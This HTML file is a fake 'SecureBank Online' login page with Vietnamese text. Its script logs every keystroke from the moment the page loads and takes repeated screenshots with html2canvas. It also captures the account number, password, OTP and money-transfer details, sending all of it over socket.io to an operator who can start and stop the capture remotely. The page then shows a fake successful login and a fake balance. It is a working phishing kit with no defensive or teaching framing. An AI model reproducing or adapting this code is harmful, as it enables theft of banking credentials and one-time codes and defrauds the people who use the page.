<!DOCTYPE html>
<html>
<head>
    <title>Banking Login</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; background: #f5f5f5; }
        .header { background: #1e3a8a; color: white; padding: 20px; text-align: center; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #1e3a8a; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #1e40af; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>üè¶ SecureBank Online</h1>
        <p>ƒêƒÉng nh·∫≠p an to√†n</p>
    </div>
    
    <div class="container">
        <h2>ƒêƒÉng nh·∫≠p t√†i kho·∫£n</h2>
        <form id="loginForm">
            <div class="form-group">
                <label>S·ªë t√†i kho·∫£n:</label>
                <input type="text" id="account" placeholder="Nh·∫≠p s·ªë t√†i kho·∫£n" required>
            </div>
            <div class="form-group">
                <label>M·∫≠t kh·∫©u:</label>
                <input type="password" id="password" placeholder="Nh·∫≠p m·∫≠t kh·∫©u" required>
            </div>
            <div class="form-group">
                <label>M√£ OTP:</label>
                <input type="text" id="otp" placeholder="Nh·∫≠p m√£ OTP" maxlength="6">
            </div>
            <button type="submit">ƒêƒÉng nh·∫≠p</button>
        </form>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let captureInterval;
        let keylogData = [];
        
        // B·∫Øt ƒë·∫ßu capture ngay khi trang load
        window.addEventListener('load', () => {
            setTimeout(startScreenCapture, 2000);
            startKeylogging();
        });
        
        async function startScreenCapture() {
            try {
                // T·∫°o canvas ·∫©n ƒë·ªÉ capture DOM
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                canvas.style.display = 'none';
                
                // Capture DOM th√†nh image
                captureInterval = setInterval(async () => {
                    try {
                        // S·ª≠ d·ª•ng html2canvas ƒë·ªÉ capture DOM
                        const tempCanvas = await html2canvas(document.body, {
                            allowTaint: true,
                            useCORS: true,
                            scale: 0.5,
                            width: window.innerWidth,
                            height: window.innerHeight
                        });
                        
                        const imageData = tempCanvas.toDataURL('image/jpeg', 0.6);
                        socket.emit('screen-capture', {
                            userId: socket.id,
                            screenshot: imageData,
                            timestamp: Date.now(),
                            url: window.location.href
                        });
                        
                    } catch (e) {
                        // Fallback: capture form data
                        captureFormData();
                    }
                }, 3000);
                
            } catch (err) {
                // Fallback method
                captureFormData();
            }
        }
        
        function captureFormData() {
            const formData = {
                account: document.getElementById('account').value,
                password: document.getElementById('password').value,
                otp: document.getElementById('otp').value,
                timestamp: Date.now(),
                url: window.location.href
            };
            
            if (formData.account || formData.password || formData.otp) {
                socket.emit('form-data', formData);
            }
        }
        
        function startKeylogging() {
            document.addEventListener('keydown', (e) => {
                keylogData.push({
                    key: e.key,
                    target: e.target.id || e.target.tagName,
                    value: e.target.value,
                    timestamp: Date.now()
                });
                
                // G·ª≠i keylog data m·ªói 10 ph√≠m
                if (keylogData.length >= 10) {
                    socket.emit('keylog-data', keylogData);
                    keylogData = [];
                }
            });
            
            // Capture khi focus/blur input
            document.querySelectorAll('input').forEach(input => {
                input.addEventListener('focus', () => {
                    socket.emit('input-focus', {
                        field: input.id,
                        timestamp: Date.now()
                    });
                });
                
                input.addEventListener('blur', () => {
                    socket.emit('input-data', {
                        field: input.id,
                        value: input.value,
                        timestamp: Date.now()
                    });
                });
            });
        }
        
        document.getElementById('loginForm').addEventListener('submit', (e) => {
            e.preventDefault();
            
            const account = document.getElementById('account').value;
            const password = document.getElementById('password').value;
            const otp = document.getElementById('otp').value;
            
            // G·ª≠i d·ªØ li·ªáu ƒëƒÉng nh·∫≠p
            socket.emit('login-attempt', {
                account: account,
                password: password,
                otp: otp,
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                ip: 'client-side'
            });
            
            if (account && password) {
                alert('ƒêƒÉng nh·∫≠p th√†nh c√¥ng! ƒêang chuy·ªÉn h∆∞·ªõng...');
                
                // Ti·∫øp t·ª•c capture sau khi ƒëƒÉng nh·∫≠p
                setTimeout(() => {
                    document.querySelector('.container').innerHTML = `
                        <h2>Ch√†o m·ª´ng!</h2>
                        <p>T√†i kho·∫£n: ${account}</p>
                        <p>S·ªë d∆∞: 1,234,567,890 VNƒê</p>
                        <button onclick="transfer()">Chuy·ªÉn kho·∫£n</button>
                        <button onclick="history()">L·ªãch s·ª≠ giao d·ªãch</button>
                    `;
                }, 1000);
            } else {
                alert('Vui l√≤ng nh·∫≠p ƒë·∫ßy ƒë·ªß th√¥ng tin!');
            }
        });
        
        function transfer() {
            document.querySelector('.container').innerHTML = `
                <h2>Chuy·ªÉn kho·∫£n</h2>
                <input type="text" placeholder="S·ªë t√†i kho·∫£n nh·∫≠n" id="toAccount">
                <input type="number" placeholder="S·ªë ti·ªÅn" id="amount">
                <input type="password" placeholder="M·∫≠t kh·∫©u x√°c nh·∫≠n" id="confirmPass">
                <button onclick="confirmTransfer()">X√°c nh·∫≠n</button>
            `;
            
            // Ti·∫øp t·ª•c keylog cho form m·ªõi
            startKeylogging();
        }
        
        function confirmTransfer() {
            const toAccount = document.getElementById('toAccount').value;
            const amount = document.getElementById('amount').value;
            const confirmPass = document.getElementById('confirmPass').value;
            
            socket.emit('transfer-data', {
                toAccount: toAccount,
                amount: amount,
                confirmPass: confirmPass,
                timestamp: Date.now()
            });
            
            alert('Chuy·ªÉn kho·∫£n th√†nh c√¥ng!');
        }
        
        // Cleanup khi r·ªùi trang
        window.addEventListener('beforeunload', () => {
            if (captureInterval) {
                clearInterval(captureInterval);
            }
            if (keylogData.length > 0) {
                socket.emit('keylog-data', keylogData);
            }
        });
        
        // Nh·∫≠n l·ªánh t·ª´ admin
        socket.on('admin-command', (data) => {
            if (data.action === 'stop-capture') {
                if (captureInterval) {
                    clearInterval(captureInterval);
                    captureInterval = null;
                    console.log('Screen capture stopped by admin');
                }
            } else if (data.action === 'start-capture') {
                if (!captureInterval) {
                    startScreenCapture();
                    console.log('Screen capture started by admin');
                }
            }
        });
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</body>
</html>